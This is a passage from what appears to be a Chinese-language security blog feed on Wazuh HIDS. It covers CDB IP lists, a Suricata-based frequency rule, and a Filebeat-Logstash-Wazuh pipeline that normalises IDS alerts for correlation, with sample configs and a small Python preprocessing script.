<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ vim /var/ossec/etc/lists/private_ip</span><br><span class="line"></span><br><span class="line">10.168.:PrivateNet</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Since Wazuh v3.11.3, CDB lists are built and loaded automatically when the analysis engine is started. Therefore, when adding or modifying CDB lists, it is no longer needed to run <code>ossec-makelists</code>, just restart the manager.</p>
</blockquote>
<p>从Wazuh v3.11.3开始，将在启动分析引擎时自动构建和加载CDB列表。因此，添加或修改CDB列表时，不再需要运行ossec-makelists，只需重新启动管理器即可。</p>
<blockquote>
<p><strong>3.11.3 之前版本需要执行</strong></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ /var/ossec/bin/ossec-makelists</span><br></pre></td></tr></table></figure>

<h5 id="2-在-ossec-conf-中添加-list"><a href="#2-在-ossec-conf-中添加-list" class="headerlink" title="2. 在 ossec.conf 中添加 list"></a>2. 在 ossec.conf 中添加 list</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ vim /var/ossec/etc/ossec.conf</span><br><span class="line"></span><br><span class="line">&lt;ossec_config&gt;</span><br><span class="line">  &lt;ruleset&gt;</span><br><span class="line">    &lt;!-- User-defined CDB --&gt;</span><br><span class="line">    &lt;list&gt;etc/lists/private_ip&lt;/list&gt;</span><br><span class="line">  &lt;/ruleset&gt;</span><br><span class="line">&lt;/ossec_config&gt;</span><br></pre></td></tr></table></figure>

<h5 id="3-重启进程"><a href="#3-重启进程" class="headerlink" title="3. 重启进程"></a>3. 重启进程</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ systemctl restart wazuh-manager</span><br></pre></td></tr></table></figure>

<h5 id="4-配置规则"><a href="#4-配置规则" class="headerlink" title="4. 配置规则"></a>4. 配置规则</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;var name=<span class="string">&quot;SAME_IP_TIME&quot;</span>&gt;120&lt;/var&gt;</span><br><span class="line">&lt;var name=<span class="string">&quot;SAME_IP_IGORE&quot;</span>&gt;300&lt;/var&gt;</span><br><span class="line"></span><br><span class="line">&lt;group name=<span class="string">&quot;local,suricata,ids,&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;rule id=<span class="string">&quot;102018&quot;</span> level=<span class="string">&quot;8&quot;</span> frequency=<span class="string">&quot;5&quot;</span> timeframe=<span class="string">&quot;<span class="variable">$SAME_IP_TIME</span>&quot;</span> ignore=<span class="string">&quot;<span class="variable">$SAME_IP_IGORE</span>&quot;</span>&gt;</span><br><span class="line">      &lt;if_matched_sid&gt;86601&lt;/if_matched_sid&gt;</span><br><span class="line">      &lt;field name=<span class="string">&quot;alert.signature_id&quot;</span>&gt;2013057&lt;/field&gt;</span><br><span class="line">      &lt;list field=<span class="string">&quot;src_ip&quot;</span> lookup=<span class="string">&quot;not_address_match_key&quot;</span>&gt;etc/lists/private_ip&lt;/list&gt;</span><br><span class="line">      &lt;description&gt;Wazuh Rules - Same ip of attack occurred 5 <span class="built_in">times</span> within <span class="variable">$SAME_IP_TIME</span> seconds. $(src_ip) -&gt; $(alert.signature) -&gt; $(alert.signature_id).&lt;/description&gt;</span><br><span class="line">      &lt;options&gt;no_full_log&lt;/options&gt;</span><br><span class="line">    &lt;/rule&gt;</span><br><span class="line"></span><br><span class="line">&lt;/group&gt;</span><br></pre></td></tr></table></figure>

<h5 id="5-测试规则"><a href="#5-测试规则" class="headerlink" title="5. 测试规则"></a>5. 测试规则</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ /var/ossec/bin/ossec-logtest</span><br></pre></td></tr></table></figure>



<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul>
<li><strong><a href="https://documentation.wazuh.com/3.11/user-manual/ruleset/cdb-list.html?highlight=match_key">Using CDB lists</a></strong></li>
</ul>
]]></content>
      <categories>
        <category>HIDS</category>
      </categories>
      <tags>
        <tag>Wazuh</tag>
      </tags>
  </entry>
  <entry>
    <title>Wazuh - 如何对异构数据进行关联告警</title>
    <url>/2020/02/25/Wazuh-%E5%A6%82%E4%BD%95%E5%AF%B9%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E8%BF%9B%E8%A1%8C%E5%85%B3%E8%81%94%E5%91%8A%E8%AD%A6/</url>
    <content><![CDATA[<p><strong>写在前面</strong></p>
<p>​       这并不是什么<strong>高精尖</strong>的架构与技术。这只是我个人在工作中结合目前手头的资源进行了一些<strong>整合</strong> 。当然实现这些需求的方法有很多, 有钱的可以考虑Splunk, 没钱的有研发的团队的可以上Flink、Esper 。 </p>
<h4 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h4><p>​    由于攻防对抗的升级, 通过单一的数据源很难直接断言攻击是否成功。因此, 我们需要结合多个数据源进行安全事件的关联, 从中提炼出可靠性较高的安全告警进行人工排查。例如: 针对WebShell上传类的, 可以通过<strong>网络流量 + 终端</strong>进行关联; 针对Web攻击类, 可以通过<strong>WAF + NIDS</strong>的事件关联, 得到Bypass WAF 的安全告警。</p>
<h4 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h4><p>​    虽然Wazuh本身具备安全事件的关联能力, 但在传统的部署架构中, 通常是由Wazuh Agent将安全事件发送到Wazuh Manager,通过Manager进行安全事件的关联告警。由于缺少了对数据进行ETL, 使得Wazuh Manager很难对异构数据进行关联。因此, 我们需要通过Logstash实现对数据的标准化, 并将标准化后的数据通过Syslog的形式发送到Wazuh Manager, 从而进行异构数据的关联。</p>
<h5 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h5><ol>
<li>本次改造采用了<strong>Syslog</strong>的形式将数据发送到Wazuh Manager端进行数据关联。由于<strong>Syslog</strong> 默认采用了<strong>UDP</strong>协议进行数据传输, 当数据发送过大时将会导致<strong>数据截断</strong>的报错。针对此问题, 需改用<strong>TCP</strong>的形式进行数据发送规避此问题。</li>
<li>Wazuh Manager 部分告警缺少”<strong>必要</strong>“关联字段的现象。如: 本次场景中<code>syscheck</code>告警事件, 默认不会携带<code>srcip</code>的字段, 对于此问题可以通过在Manager上编写一个预处理脚本来解决。</li>
</ol>
<h4 id="改造"><a href="#改造" class="headerlink" title="改造"></a>改造</h4><ol>
<li><h5 id="改造之前"><a href="#改造之前" class="headerlink" title="改造之前:"></a>改造之前:</h5><p>Suricata (Wazuh agent) —(Agent: UDP 1514)—&gt; Wazuh Manager</p>
</li>
<li><h5 id="改造之后"><a href="#改造之后" class="headerlink" title="改造之后:"></a>改造之后:</h5><p>所有的标准化都由Logstash来进行, Filebeat只需要做’<strong>无脑</strong>‘转发即可。</p>
</li>
</ol>
<p><strong>workflow:</strong></p>
<p><img src="/2020/02/25/Wazuh-%E5%A6%82%E4%BD%95%E5%AF%B9%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E8%BF%9B%E8%A1%8C%E5%85%B3%E8%81%94%E5%91%8A%E8%AD%A6/image-20200303215020561.png" alt="image-20200303215020561"></p>
<hr>
<h5 id="Filebeat配置"><a href="#Filebeat配置" class="headerlink" title="Filebeat配置"></a>Filebeat配置</h5><ul>
<li><h6 id="filebeat-yaml"><a href="#filebeat-yaml" class="headerlink" title="filebeat.yaml"></a>filebeat.yaml</h6></li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#=========================== Filebeat inputs =============================</span></span><br><span class="line"><span class="attr">filebeat.inputs:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">log</span></span><br><span class="line">  <span class="attr">paths:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;/var/log/suricata/alert-*.json&quot;</span></span><br><span class="line">  <span class="attr">fields_under_root:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">fields:</span> &#123; <span class="attr">application:</span> <span class="string">suricata</span> &#125;</span><br><span class="line">  <span class="attr">json.keys_under_root:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">json.overwrite_keys:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">json.message_key:</span> <span class="string">log</span></span><br><span class="line">  <span class="attr">tail_files:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">scan_frequency:</span> <span class="string">1s</span></span><br><span class="line">  <span class="attr">harvester_buffer_size:</span> <span class="number">104857600</span></span><br><span class="line">  <span class="attr">backoff:</span> <span class="string">1s</span></span><br><span class="line">  <span class="attr">max_backoff:</span> <span class="string">10s</span></span><br><span class="line">  <span class="attr">close_timeout:</span> <span class="string">30m</span></span><br><span class="line">  <span class="attr">close_inactive:</span> <span class="string">10m</span></span><br><span class="line">  <span class="attr">clean_inactive:</span> <span class="string">72h</span></span><br><span class="line">  <span class="attr">ignore_older:</span> <span class="string">70h</span></span><br><span class="line">  <span class="attr">registry_file:</span> <span class="string">/etc/filebeat/registry/wazuh/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#================================ Processors ==================================</span></span><br><span class="line"><span class="attr">processors:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">drop_fields:</span></span><br><span class="line">    <span class="attr">fields:</span> [<span class="string">&quot;ecs.version&quot;</span>, <span class="string">&quot;agent.ephemeral_id&quot;</span>, <span class="string">&quot;agent.version&quot;</span>, <span class="string">&quot;agent.type&quot;</span>, <span class="string">&quot;agent.id&quot;</span>, <span class="string">&quot;agent.ephemeral_id&quot;</span>, <span class="string">&quot;input.type&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#================================ Outputs =====================================</span></span><br><span class="line"><span class="attr">output.logstash:</span></span><br><span class="line">  <span class="attr">hosts:</span> [<span class="string">&quot;logstash:5010&quot;</span>]</span><br><span class="line">  <span class="attr">loadbalance:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">worker:</span> <span class="number">4</span></span><br><span class="line">  <span class="attr">compression_level:</span> <span class="number">3</span></span><br><span class="line">  <span class="attr">bulk_max_size:</span> <span class="number">4096</span></span><br></pre></td></tr></table></figure>

<hr>
<h5 id="Logstash配置"><a href="#Logstash配置" class="headerlink" title="Logstash配置"></a>Logstash配置</h5><ul>
<li><h6 id="00-input-conf"><a href="#00-input-conf" class="headerlink" title="00_input.conf"></a>00_input.conf</h6></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">input &#123;</span><br><span class="line">  beats &#123;</span><br><span class="line">    port =&gt; 5010</span><br><span class="line">    codec =&gt; <span class="string">&quot;json_lines&quot;</span></span><br><span class="line">    tags =&gt; [<span class="string">&quot;beats&quot;</span>]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><h6 id="50-suricata-conf"><a href="#50-suricata-conf" class="headerlink" title="50_suricata.conf"></a>50_suricata.conf</h6></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">  <span class="keyword">if</span> [application] == <span class="string">&quot;suricata&quot;</span> &#123;</span><br><span class="line">    date &#123;</span><br><span class="line">      match =&gt; [ <span class="string">&quot;timestamp&quot;</span>, <span class="string">&quot;ISO8601&quot;</span> ]</span><br><span class="line">      target =&gt; <span class="string">&quot;timestamp&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><h6 id="mapping-json"><a href="#mapping-json" class="headerlink" title="mapping.json"></a>mapping.json</h6></li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;common_mapping&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;src_ip&quot;</span>: <span class="string">&quot;srcip&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;dest_ip&quot;</span>: <span class="string">&quot;dstip&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;src_port&quot;</span>: <span class="string">&quot;srcport&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;dest_port&quot;</span>: <span class="string">&quot;dstport&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><h6 id="70-normalized-suricata-conf"><a href="#70-normalized-suricata-conf" class="headerlink" title="70_normalized-suricata.conf"></a>70_normalized-suricata.conf</h6></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">  <span class="built_in">clone</span> &#123;</span><br><span class="line">    clones =&gt; [ <span class="string">&quot;siem_events&quot;</span> ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">filter &#123;</span><br><span class="line">  <span class="keyword">if</span> [<span class="built_in">type</span>] == <span class="string">&quot;siem_events&quot;</span> &#123;</span><br><span class="line">    mutate &#123;</span><br><span class="line">      remove_field =&gt; [ <span class="string">&quot;application&quot;</span>, <span class="string">&quot;type&quot;</span>, <span class="string">&quot;agent&quot;</span>, <span class="string">&quot;@version&quot;</span>, <span class="string">&quot;@timestamp&quot;</span>]</span><br><span class="line">      add_field =&gt; &#123;</span><br><span class="line">        <span class="string">&quot;provider&quot;</span> =&gt; <span class="string">&quot;Suricata&quot;</span></span><br><span class="line">        <span class="string">&quot;product&quot;</span> =&gt; <span class="string">&quot;Intrusion Detection System&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ruby &#123;</span><br><span class="line">      init =&gt; <span class="string">&quot;</span></span><br><span class="line"><span class="string">        require &#x27;json&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        mapping_json = File.read(&#x27;/etc/logstash/mappings/wazuh/mapping.json&#x27;)</span></span><br><span class="line"><span class="string">        mapping = JSON.parse(mapping_json)</span></span><br><span class="line"><span class="string">        @common_mapping = mapping[&#x27;common_mapping&#x27;]</span></span><br><span class="line"><span class="string">      &quot;</span></span><br><span class="line"></span><br><span class="line">      code =&gt; <span class="string">&quot;</span></span><br><span class="line"><span class="string">        keys = event.to_hash.keys</span></span><br><span class="line"><span class="string">        keys.each do |key|</span></span><br><span class="line"><span class="string">            if @common_mapping.include? key then</span></span><br><span class="line"><span class="string">                value = event.get(key)</span></span><br><span class="line"><span class="string">                event.remove(key)</span></span><br><span class="line"><span class="string">                new_key = @common_mapping[key]</span></span><br><span class="line"><span class="string">                event.set(new_key, value)</span></span><br><span class="line"><span class="string">            end</span></span><br><span class="line"><span class="string">        end</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        sensor = event.get(&#x27;[host][name]&#x27;)</span></span><br><span class="line"><span class="string">        event.set(&#x27;sensor&#x27;, sensor)</span></span><br><span class="line"><span class="string">      &quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><h6 id="99-output-elasticsearch-conf"><a href="#99-output-elasticsearch-conf" class="headerlink" title="99_output-elasticsearch.conf"></a>99_output-elasticsearch.conf</h6></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">output &#123;</span><br><span class="line">  <span class="keyword">if</span> [event_type] == <span class="string">&quot;alert&quot;</span> &#123;</span><br><span class="line">    elasticsearch &#123;</span><br><span class="line">      cacert =&gt; <span class="string">&quot;/etc/logstash/certs/ca/ca.crt&quot;</span></span><br><span class="line">      user =&gt; <span class="string">&quot;elastic&quot;</span></span><br><span class="line">      password =&gt; <span class="string">&quot;Hello World!&quot;</span></span><br><span class="line">      hosts =&gt; [<span class="string">&quot;https://elasticsearch:9200&quot;</span>]</span><br><span class="line">      index =&gt; <span class="string">&quot;suricata-%&#123;+YYYY.MM.dd&#125;&quot;</span></span><br><span class="line">      template =&gt; <span class="string">&quot;/etc/logstash/index-template.d/suricata-template.json&quot;</span></span><br><span class="line">      template_name =&gt; <span class="string">&quot;suricata&quot;</span></span><br><span class="line">      template_overwrite =&gt; <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><h6 id="99-output-wazuh-conf"><a href="#99-output-wazuh-conf" class="headerlink" title="99_output-wazuh.conf"></a>99_output-wazuh.conf</h6></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">output &#123;</span><br><span class="line">  <span class="keyword">if</span> [provider] == <span class="string">&quot;Suricata&quot;</span> &#123;</span><br><span class="line">    syslog &#123;</span><br><span class="line">        host =&gt; <span class="string">&quot;wazuh&quot;</span></span><br><span class="line">        protocol =&gt; <span class="string">&quot;tcp&quot;</span></span><br><span class="line">        port =&gt; 514</span><br><span class="line">        codec =&gt; <span class="string">&quot;json&quot;</span></span><br><span class="line">        sourcehost =&gt; <span class="string">&quot;logstash&quot;</span></span><br><span class="line">        appname =&gt; <span class="string">&quot;NORMALIZED&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#stdout &#123;</span></span><br><span class="line">        <span class="comment">#codec =&gt; rubydebug</span></span><br><span class="line">    <span class="comment">#&#125;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="Wazuh配置"><a href="#Wazuh配置" class="headerlink" title="Wazuh配置"></a>Wazuh配置</h5><ul>
<li><h6 id="custom-syscheck-py"><a href="#custom-syscheck-py" class="headerlink" title="custom-syscheck.py"></a>custom-syscheck.py</h6><p>Wazuh Manager 新增预处理脚本对指定的安全事件进行预处理。如: syscheck事件增加<code>srcip</code>字段。</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timedelta, timezone</span><br><span class="line"></span><br><span class="line"><span class="comment"># ossec.conf configuration:</span></span><br><span class="line"><span class="comment">#  &lt;integration&gt;</span></span><br><span class="line"><span class="comment">#      &lt;name&gt;custom-syscheck&lt;/name&gt;</span></span><br><span class="line"><span class="comment">#      &lt;rule_id&gt;554&lt;/rule_id&gt;</span></span><br><span class="line"><span class="comment">#      &lt;group&gt;syscheck&lt;/group&gt;</span></span><br><span class="line"><span class="comment">#      &lt;alert_format&gt;json&lt;/alert_format&gt;</span></span><br><span class="line"><span class="comment">#  &lt;/integration&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Global vars</span></span><br><span class="line">debug_enabled = <span class="literal">False</span></span><br><span class="line">pwd = os.path.dirname(os.path.dirname(os.path.realpath(__file__)))</span><br><span class="line">json_alert = &#123;&#125;</span><br><span class="line">now = time.strftime(<span class="string">&quot;%a %b %d %H:%M:%S %Z %Y&quot;</span>)</span><br><span class="line">wazuh_server = <span class="string">&quot;192.168.199.97&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set paths</span></span><br><span class="line">log_file = <span class="string">&#x27;&#123;0&#125;/logs/integrations.log&#x27;</span>.<span class="built_in">format</span>(pwd)</span><br><span class="line">syscheck_file = <span class="string">&#x27;&#123;0&#125;/logs/syscheck.json&#x27;</span>.<span class="built_in">format</span>(pwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">iso8601</span>(<span class="params">hours=<span class="number">8</span></span>):</span></span><br><span class="line">    td = timedelta(hours=hours)</span><br><span class="line">    tz = timezone(td)</span><br><span class="line">    <span class="keyword">return</span> datetime.now(tz=tz).isoformat()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">args</span>):</span></span><br><span class="line">    debug(<span class="string">&quot;# Starting&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Read args</span></span><br><span class="line">    alert_file_location = args[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    debug(<span class="string">&quot;# File location&quot;</span>)</span><br><span class="line">    debug(alert_file_location)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Load alert. Parse JSON object.</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(alert_file_location) <span class="keyword">as</span> alert_file:</span><br><span class="line">        json_alert = json.load(alert_file)</span><br><span class="line">    debug(<span class="string">&quot;# Processing alert&quot;</span>)</span><br><span class="line">    debug(json_alert)</span><br><span class="line"></span><br><span class="line">    alert = normalized_data(json_alert)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(syscheck_file, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        msg = json.dumps(alert)</span><br><span class="line">        f.write(msg + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">msg</span>):</span></span><br><span class="line">    <span class="keyword">if</span> debug_enabled:</span><br><span class="line">        msg = <span class="string">&quot;&#123;0&#125;: &#123;1&#125;\n&quot;</span>.<span class="built_in">format</span>(now, msg)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(msg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">normalized_data</span>(<span class="params">alert</span>):</span></span><br><span class="line">    <span class="keyword">if</span> alert[<span class="string">&#x27;agent&#x27;</span>][<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;000&#x27;</span>:</span><br><span class="line">        alert[<span class="string">&#x27;srcip&#x27;</span>] = wazuh_server</span><br><span class="line">    <span class="keyword">elif</span> alert[<span class="string">&#x27;agent&#x27;</span>].get(<span class="string">&#x27;ip&#x27;</span>):</span><br><span class="line">        alert[<span class="string">&#x27;srcip&#x27;</span>] = alert[<span class="string">&#x27;agent&#x27;</span>][<span class="string">&#x27;ip&#x27;</span>]</span><br><span class="line">        alert[<span class="string">&#x27;dstip&#x27;</span>] = alert[<span class="string">&#x27;agent&#x27;</span>][<span class="string">&#x27;ip&#x27;</span>]</span><br><span class="line">    alert[<span class="string">&#x27;integration&#x27;</span>] = <span class="string">&#x27;custom-syscheck&#x27;</span></span><br><span class="line">    alert[<span class="string">&#x27;create_timestamp&#x27;</span>] = iso8601()</span><br><span class="line">    debug(alert)</span><br><span class="line">    <span class="keyword">return</span>(alert)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Read arguments</span></span><br><span class="line">        bad_arguments = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt;= <span class="number">4</span>:</span><br><span class="line">            msg = <span class="string">&#x27;&#123;0&#125; &#123;1&#125; &#123;2&#125; &#123;3&#125; &#123;4&#125;&#x27;</span>.<span class="built_in">format</span>(now, sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], sys.argv[<span class="number">3</span>], sys.argv[<span class="number">4</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">4</span> <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg = <span class="string">&#x27;&#123;0&#125; Wrong arguments&#x27;</span>.<span class="built_in">format</span>(now)</span><br><span class="line">            bad_arguments = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Logging the call</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(msg + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> bad_arguments:</span><br><span class="line">            debug(<span class="string">&quot;# Exiting: Bad arguments.&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Main function</span></span><br><span class="line">        main(sys.argv)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        debug(<span class="built_in">str</span>(e))</span><br><span class="line">        <span class="keyword">raise</span></span><br></pre></td></tr></table></figure>

<ul>
<li><h6 id="ossec-conf"><a href="#ossec-conf" class="headerlink" title="ossec.conf"></a>ossec.conf</h6><ul>
<li>配置syslog选用<strong>TCP</strong>协议;</li>
<li>加载预处理脚本;</li>
<li>加载脚本输出日志;</li>
</ul>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ossec_config</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">remote</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">connection</span>&gt;</span>syslog<span class="tag">&lt;/<span class="name">connection</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">port</span>&gt;</span>514<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">protocol</span>&gt;</span>tcp<span class="tag">&lt;/<span class="name">protocol</span>&gt;</span> <span class="comment">&lt;!-- udp(default)/tcp --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">allowed-ips</span>&gt;</span>192.168.199.0/24<span class="tag">&lt;/<span class="name">allowed-ips</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">remote</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">&lt;!-- Custom external Integration --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">integration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>custom-syscheck<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">rule_id</span>&gt;</span>554<span class="tag">&lt;/<span class="name">rule_id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">group</span>&gt;</span>syscheck<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">alert_format</span>&gt;</span>json<span class="tag">&lt;/<span class="name">alert_format</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">integration</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">&lt;!-- Custom syscheck.json --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">localfile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">log_format</span>&gt;</span>json<span class="tag">&lt;/<span class="name">log_format</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">location</span>&gt;</span>/var/ossec/logs/syscheck.json<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">localfile</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ossec_config</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><h6 id="local-decoder-normalized-xml"><a href="#local-decoder-normalized-xml" class="headerlink" title="local_decoder_normalized.xml"></a>local_decoder_normalized.xml</h6></li>
</ul>
<p><strong>Sample</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">2020 Mar 03 02:53:39 logstash NORMALIZED[-]: &#123;&quot;timestamp&quot;:&quot;2020-02-21T19:47:04.382300+0800&quot;,&quot;flow_id&quot;:1133835979634527,&quot;in_iface&quot;:&quot;wlp3s0&quot;,&quot;event_type&quot;:&quot;alert&quot;,&quot;src_ip&quot;:&quot;192.168.199.97&quot;,&quot;src_port&quot;:60022,&quot;dest_ip&quot;:&quot;192.168.199.162&quot;,&quot;dest_port&quot;:59143,&quot;proto&quot;:&quot;TCP&quot;,&quot;alert&quot;:&#123;&quot;action&quot;:&quot;allowed&quot;,&quot;gid&quot;:1,&quot;signature_id&quot;:123456,&quot;rev&quot;:1,&quot;signature&quot;:&quot;LOCAL RULES XXX&quot;,&quot;severity&quot;:3&#125;&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">decoder</span> <span class="attr">name</span>=<span class="string">&quot;nta_json&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">prematch</span>&gt;</span>NORMALIZED[-]: <span class="tag">&lt;/<span class="name">prematch</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugin_decoder</span> <span class="attr">offset</span>=<span class="string">&quot;after_prematch&quot;</span>&gt;</span>JSON_Decoder<span class="tag">&lt;/<span class="name">plugin_decoder</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">decoder</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><h6 id="0901-local-raw-xml"><a href="#0901-local-raw-xml" class="headerlink" title="0901-local_raw.xml"></a>0901-local_raw.xml</h6><ul>
<li>默认引用的解码器为<code>json</code>, 这里需要修改为刚才新增的<code>nta_json</code>;</li>
<li>通过<code>overwrite=yes</code>覆盖原始规则;</li>
</ul>
</li>
</ul>
